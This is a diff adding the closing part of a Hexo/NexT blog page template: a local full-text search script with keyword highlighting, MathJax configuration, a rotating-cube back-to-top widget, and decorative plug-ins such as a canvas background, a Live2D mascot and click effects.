+                var title = data.title.trim();
+                var titleInLowerCase = title.toLowerCase();
+                var content = data.content.trim().replace(/<[^>]+>/g,"");
+                var contentInLowerCase = content.toLowerCase();
+                var articleUrl = decodeURIComponent(data.url);
+                var indexOfTitle = [];
+                var indexOfContent = [];
+                // only match articles with not empty titles
+                if(title != '') {
+                  keywords.forEach(function(keyword) {
+                    function getIndexByWord(word, text, caseSensitive) {
+                      var wordLen = word.length;
+                      if (wordLen === 0) {
+                        return [];
+                      }
+                      var startPosition = 0, position = [], index = [];
+                      if (!caseSensitive) {
+                        text = text.toLowerCase();
+                        word = word.toLowerCase();
+                      }
+                      while ((position = text.indexOf(word, startPosition)) > -1) {
+                        index.push({position: position, word: word});
+                        startPosition = position + wordLen;
+                      }
+                      return index;
+                    }
+
+                    indexOfTitle = indexOfTitle.concat(getIndexByWord(keyword, titleInLowerCase, false));
+                    indexOfContent = indexOfContent.concat(getIndexByWord(keyword, contentInLowerCase, false));
+                  });
+                  if (indexOfTitle.length > 0 || indexOfContent.length > 0) {
+                    isMatch = true;
+                    hitCount = indexOfTitle.length + indexOfContent.length;
+                  }
+                }
+
+                // show search results
+
+                if (isMatch) {
+                  // sort index by position of keyword
+
+                  [indexOfTitle, indexOfContent].forEach(function (index) {
+                    index.sort(function (itemLeft, itemRight) {
+                      if (itemRight.position !== itemLeft.position) {
+                        return itemRight.position - itemLeft.position;
+                      } else {
+                        return itemLeft.word.length - itemRight.word.length;
+                      }
+                    });
+                  });
+
+                  // merge hits into slices
+
+                  function mergeIntoSlice(text, start, end, index) {
+                    var item = index[index.length - 1];
+                    var position = item.position;
+                    var word = item.word;
+                    var hits = [];
+                    var searchTextCountInSlice = 0;
+                    while (position + word.length <= end && index.length != 0) {
+                      if (word === searchText) {
+                        searchTextCountInSlice++;
+                      }
+                      hits.push({position: position, length: word.length});
+                      var wordEnd = position + word.length;
+
+                      // move to next position of hit
+
+                      index.pop();
+                      while (index.length != 0) {
+                        item = index[index.length - 1];
+                        position = item.position;
+                        word = item.word;
+                        if (wordEnd > position) {
+                          index.pop();
+                        } else {
+                          break;
+                        }
+                      }
+                    }
+                    searchTextCount += searchTextCountInSlice;
+                    return {
+                      hits: hits,
+                      start: start,
+                      end: end,
+                      searchTextCount: searchTextCountInSlice
+                    };
+                  }
+
+                  var slicesOfTitle = [];
+                  if (indexOfTitle.length != 0) {
+                    slicesOfTitle.push(mergeIntoSlice(title, 0, title.length, indexOfTitle));
+                  }
+
+                  var slicesOfContent = [];
+                  while (indexOfContent.length != 0) {
+                    var item = indexOfContent[indexOfContent.length - 1];
+                    var position = item.position;
+                    var word = item.word;
+                    // cut out 100 characters
+                    var start = position - 20;
+                    var end = position + 80;
+                    if(start < 0){
+                      start = 0;
+                    }
+                    if (end < position + word.length) {
+                      end = position + word.length;
+                    }
+                    if(end > content.length){
+                      end = content.length;
+                    }
+                    slicesOfContent.push(mergeIntoSlice(content, start, end, indexOfContent));
+                  }
+
+                  // sort slices in content by search text's count and hits' count
+
+                  slicesOfContent.sort(function (sliceLeft, sliceRight) {
+                    if (sliceLeft.searchTextCount !== sliceRight.searchTextCount) {
+                      return sliceRight.searchTextCount - sliceLeft.searchTextCount;
+                    } else if (sliceLeft.hits.length !== sliceRight.hits.length) {
+                      return sliceRight.hits.length - sliceLeft.hits.length;
+                    } else {
+                      return sliceLeft.start - sliceRight.start;
+                    }
+                  });
+
+                  // select top N slices in content
+
+                  var upperBound = parseInt('1');
+                  if (upperBound >= 0) {
+                    slicesOfContent = slicesOfContent.slice(0, upperBound);
+                  }
+
+                  // highlight title and content
+
+                  function highlightKeyword(text, slice) {
+                    var result = '';
+                    var prevEnd = slice.start;
+                    slice.hits.forEach(function (hit) {
+                      result += text.substring(prevEnd, hit.position);
+                      var end = hit.position + hit.length;
+                      result += '<b class="search-keyword">' + text.substring(hit.position, end) + '</b>';
+                      prevEnd = end;
+                    });
+                    result += text.substring(prevEnd, slice.end);
+                    return result;
+                  }
+
+                  var resultItem = '';
+
+                  if (slicesOfTitle.length != 0) {
+                    resultItem += "<li><a href='" + articleUrl + "' class='search-result-title'>" + highlightKeyword(title, slicesOfTitle[0]) + "</a>";
+                  } else {
+                    resultItem += "<li><a href='" + articleUrl + "' class='search-result-title'>" + title + "</a>";
+                  }
+
+                  slicesOfContent.forEach(function (slice) {
+                    resultItem += "<a href='" + articleUrl + "'>" +
+                      "<p class=\"search-result\">" + highlightKeyword(content, slice) +
+                      "...</p>" + "</a>";
+                  });
+
+                  resultItem += "</li>";
+                  resultItems.push({
+                    item: resultItem,
+                    searchTextCount: searchTextCount,
+                    hitCount: hitCount,
+                    id: resultItems.length
+                  });
+                }
+              })
+            };
+            if (keywords.length === 1 && keywords[0] === "") {
+              resultContent.innerHTML = '<div id="no-result"><i class="fa fa-search fa-5x" /></div>'
+            } else if (resultItems.length === 0) {
+              resultContent.innerHTML = '<div id="no-result"><i class="fa fa-frown-o fa-5x" /></div>'
+            } else {
+              resultItems.sort(function (resultLeft, resultRight) {
+                if (resultLeft.searchTextCount !== resultRight.searchTextCount) {
+                  return resultRight.searchTextCount - resultLeft.searchTextCount;
+                } else if (resultLeft.hitCount !== resultRight.hitCount) {
+                  return resultRight.hitCount - resultLeft.hitCount;
+                } else {
+                  return resultRight.id - resultLeft.id;
+                }
+              });
+              var searchResultList = '<ul class=\"search-result-list\">';
+              resultItems.forEach(function (result) {
+                searchResultList += result.item;
+              })
+              searchResultList += "</ul>";
+              resultContent.innerHTML = searchResultList;
+            }
+          }
+
+          if ('auto' === 'auto') {
+            input.addEventListener('input', inputEventFunction);
+          } else {
+            $('.search-icon').click(inputEventFunction);
+            input.addEventListener('keypress', function (event) {
+              if (event.keyCode === 13) {
+                inputEventFunction();
+              }
+            });
+          }
+
+          // remove loading animation
+          $(".local-search-pop-overlay").remove();
+          $('body').css('overflow', '');
+
+          proceedsearch();
+        }
+      });
+    }
+
+    // handle and trigger popup window;
+    $('.popup-trigger').click(function(e) {
+      e.stopPropagation();
+      if (isfetched === false) {
+        searchFunc(path, 'local-search-input', 'local-search-result');
+      } else {
+        proceedsearch();
+      };
+    });
+
+    $('.popup-btn-close').click(onPopupClose);
+    $('.popup').click(function(e){
+      e.stopPropagation();
+    });
+    $(document).on('keyup', function (event) {
+      var shouldDismissSearchPopup = event.which === 27 &&
+        $('.search-popup').is(':visible');
+      if (shouldDismissSearchPopup) {
+        onPopupClose();
+      }
+    });
+  </script>
+
+
+
+
+
+  
+
+  
+
+  
+
+  
+  
+
+  
+  
+    <script type="text/x-mathjax-config">
+      MathJax.Hub.Config({
+        tex2jax: {
+          inlineMath: [ ['$','$'], ["\\(","\\)"]  ],
+          processEscapes: true,
+          skipTags: ['script', 'noscript', 'style', 'textarea', 'pre', 'code']
+        }
+      });
+    </script>
+
+    <script type="text/x-mathjax-config">
+      MathJax.Hub.Queue(function() {
+        var all = MathJax.Hub.getAllJax(), i;
+        for (i=0; i < all.length; i += 1) {
+          all[i].SourceElement().parentNode.className += ' has-jax';
+        }
+      });
+    </script>
+    <script type="text/javascript" src="//cdn.bootcss.com/mathjax/2.7.1/latest.js?config=TeX-AMS-MML_HTMLorMML"></script>
+  
+
+
+  
+
+  
+
+  
+  <!-- 旋转魔方 -->
+
+   
+      <style>
+  /*最外层容器样式*/
+  .wrap {
+    width: 0px;
+    height: 0px;
+    /*margin: 80px;*/
+    /*position: relative;*/
+    position: fixed;
+      /*显示位置*/
+    bottom: 200px;
+    right: 70px;
+    z-index: 999;
+  }
+
+  /*包裹所有容器样式*/
+  .cube {
+    width: 0px;
+    height: 0px;
+    margin: 0 auto;
+    -webkit-transform-style: preserve-3d;
+    transform-style: preserve-3d;
+    transform: rotateX(-30deg) rotateY(-80deg);
+    animation: rotate linear 10s infinite;
+  }
+
+  @-webkit-keyframes rotate {
+    from {
+      transform: rotateX(0deg) rotateY(0deg);
+    }
+    to {
+      transform: rotateX(360deg) rotateY(360deg);
+    }
+  }
+
+  .cube div {
+    position: absolute;
+    /*显示大小*/
+    width: 50px;
+    height: 50px;
+    opacity: 0.8;
+    transition: all .4s;
+  }
+
+  /*定义所有图片样式*/
+  .pic {
+    width: 50px;
+    height: 50px;
+  }
+
+  .cube .out_front {
+    transform: rotateY(0deg) translateZ(25px);
+  }
+
+  .cube .out_back {
+    transform: translateZ(-25px) rotateY(180deg);
+  }
+
+  .cube .out_left {
+    transform: rotateY(-90deg) translateZ(25px);
+  }
+
+  .cube .out_right {
+    transform: rotateY(90deg) translateZ(25px);
+  }
+
+  .cube .out_top {
+    transform: rotateX(90deg) translateZ(25px);
+  }
+
+  .cube .out_bottom {
+    transform: rotateX(-90deg) translateZ(25px);
+  }
+
+  /*定义小正方体样式*/
+  .cube span {
+    display: block;
+    width: 25px;
+    height: 25px;
+    position: absolute;
+    top: 12px;
+    left: 12px;
+  }
+
+  .cube .in_pic {
+    width: 25px;
+    height:25px;
+  }
+
+  .cube .in_front {
+    transform: rotateY(0deg) translateZ(12px);
+  }
+
+  .cube .in_back {
+    transform: translateZ(-12px) rotateY(180deg);
+  }
+
+  .cube .in_left {
+    transform: rotateY(-90deg) translateZ(12px);
+  }
+
+  .cube .in_right {
+    transform: rotateY(90deg) translateZ(12px);
+  }
+
+  .cube .in_top {
+    transform: rotateX(90deg) translateZ(12px);
+  }
+
+  .cube .in_bottom {
+    transform: rotateX(-90deg) translateZ(12px);
+  }
+
+  /*鼠标移入后样式*/
+  .cube:hover .out_front {
+    transform: rotateY(0deg) translateZ(50px);
+  }
+
+  .cube:hover .out_back {
+    transform: translateZ(-50px) rotateY(180deg);
+  }
+
+  .cube:hover .out_left {
+    transform: rotateY(-90deg) translateZ(50px);
+  }
+
+  .cube:hover .out_right {
+    transform: rotateY(90deg) translateZ(50px);
+  }
+
+  .cube:hover .out_top {
+    transform: rotateX(90deg) translateZ(50px);
+  }
+
+  .cube:hover .out_bottom {
+    transform: rotateX(-90deg) translateZ(50px);
+  }
+</style>
+
+<!--图片路径https://raw.githubusercontent.com/Aurthoria/Pictures/master/img/20200309224636.png-->
+
+<div class="wrap">
+
+    <!--包裹所有元素的容器-->
+    <div class="cube">
+        <!--前面图片 -->
+        <div class="out_front">
+          <a onclick="back2top()">
+              <img src="https://img.rruu.net/image/5e677fbd492ae" class="pic" />
+            </a>
+        </div>
+        <!--后面图片 -->
+        <div class="out_back">
+            <a onclick="back2top()">
+              <img src="https://img.rruu.net/image/5e677fbd492ae" class="pic" />
+            </a>
+        </div>
+        <!--左面图片 -->
+        <div class="out_left">
+            <a onclick="back2top()">
+              <img src="https://img.rruu.net/image/5e677fbd492ae" class="pic" />
+            </a>
+        </div>
+        <!--右面图片 -->
+        <div class="out_right">
+            <a onclick="back2top()">
+                <img src="https://img.rruu.net/image/5e677fbd492ae" class="pic" />
+            </a>
+        </div>
+        <!--上面图片 -->
+        <div class="out_top">
+            <a onclick="back2top()">
+                <img src="https://img.rruu.net/image/5e677fbd492ae" class="pic" />
+            </a>
+        </div>
+        <!--下面图片 -->
+        <div class="out_bottom">
+            <a onclick="back2top()">
+                <img src="https://img.rruu.net/image/5e677fbd492ae" class="pic" />
+            </a>
+        </div>
+
+        <!--小正方体 -->
+        <span class="in_front">
+            <img src="https://img.rruu.net/image/5e677fbd492ae" class="in_pic" />
+        </span>
+        <span class="in_back">
+             <img src="https://img.rruu.net/image/5e677fbd492ae" class="in_pic" />
+        </span>
+        <span class="in_left">
+            <img src="https://img.rruu.net/image/5e677fbd492ae" class="in_pic" />
+        </span>
+        <span class="in_right">
+            <img src="https://img.rruu.net/image/5e677fbd492ae" class="in_pic" />
+        </span>
+        <span class="in_top">
+            <img src="https://img.rruu.net/image/5e677fbd492ae" class="in_pic" />
+        </span>
+        <span class="in_bottom">
+            <img src="https://img.rruu.net/image/5e677fbd492ae" class="in_pic" />
+        </span>
+    </div>
+</div>
+
+<script>
+  function back2top(){
+    $('html, body').animate({scrollTop: 0}, 500);
+  }
+</script>
+   
+
+
+
+  <canvas id="evanyou"></canvas>
+  <style>
+    #evanyou {
+      position: fixed;
+      width: 100%;
+      height: 100%;
+      top: 0;
+      left: 0;
+      z-index: -1;
+    }
+  </style>
+  <script src="/js/evan-you.js"></script>
+
+
+<!-- 代码复制 -->
+<script type="text/javascript" src="/js/src/clipboard.min.js"></script>
+<script type="text/javascript" src="/js/src/clipboard-use.js"></script>
+
+
+
+  <script src="/js/activate-power-mode.min.js"></script>
+  <script>
+    POWERMODE.colorful = true;
+    POWERMODE.shake = false;
+    document.body.addEventListener('input', POWERMODE);
+  </script><!-- hexo-inject:begin --><!-- hexo-inject:end -->
+
+<script>!function(e){var c=Array.prototype.slice.call(document.querySelectorAll("img[data-original]"));function i(){for(var r=0;r<c.length;r++)t=c[r],0<=(n=t.getBoundingClientRect()).bottom&&0<=n.left&&n.top<=(e.innerHeight||document.documentElement.clientHeight)&&function(){var t,n,e,i,o=c[r];t=o,n=function(){c=c.filter(function(t){return o!==t})},e=new Image,i=t.getAttribute("data-original"),e.onload=function(){t.src=i,n&&n()},e.src=i}();var t,n}i(),e.addEventListener("scroll",function(){var t,n;t=i,n=e,clearTimeout(t.tId),t.tId=setTimeout(function(){t.call(n)},500)})}(this);</script><script>window.addEventListener("load",function(){var t=/\.(gif|jpg|jpeg|tiff|png)$/i,r=/^data:image\/[a-z]+;base64,/;Array.prototype.slice.call(document.querySelectorAll("img[data-original]")).forEach(function(a){var e=a.parentNode;"A"===e.tagName&&(e.href.match(t)||e.href.match(r))&&(e.href=a.dataset.original)})});</script></body>
+</html>
+<!-- 页面点击小红心 -->
+<script type="text/javascript" src="/js/src/clicklove.js"></script>
+<!-- 看板娘 -->
+<script src="/live2d-widget/autoload.js"></script>
+<!--崩溃欺骗-->
+<script type="text/javascript" src="/js/src/crash_cheat.js"></script>
